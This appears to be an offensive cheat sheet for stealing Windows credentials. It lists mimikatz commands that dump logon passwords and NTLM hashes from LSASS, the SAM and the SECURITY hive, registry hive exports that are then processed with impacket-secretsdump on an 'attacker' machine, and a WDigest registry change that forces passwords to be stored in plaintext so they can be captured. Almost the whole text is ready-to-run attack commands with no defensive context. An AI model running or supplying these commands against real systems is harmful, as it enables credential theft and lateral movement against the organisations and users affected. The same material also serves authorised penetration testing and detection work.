# Dump all credentials (plaintext where available)
mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Extract only specific user
sekurlsa::logonpasswords /user:Administrator

# Extract from LSASS (most reliable)
sekurlsa::logonpasswords full

# Extract from SAM
lsadump::sam

# Extract from SAM with SYSTEM (offline)
lsadump::sam /system:SYSTEM /sam:SAM

# Extract from SECURITY hive
lsadump::secrets

NTLM Hash Extraction

# Dump NTLM hashes from LSASS
mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit" | findstr "NTLM"

# Extract from SAM (offline)
reg save hklm\sam C:\sam.hive
reg save hklm\system C:\system.hive
# On attacker:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

Force Plaintext Storage
# Windows 8.1/2012R2+ disables WDigest by default
# Enable it to get plaintext passwords
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# Reboot or lock/unlock user session to capture
mimikatz "sekurlsa::wdigest"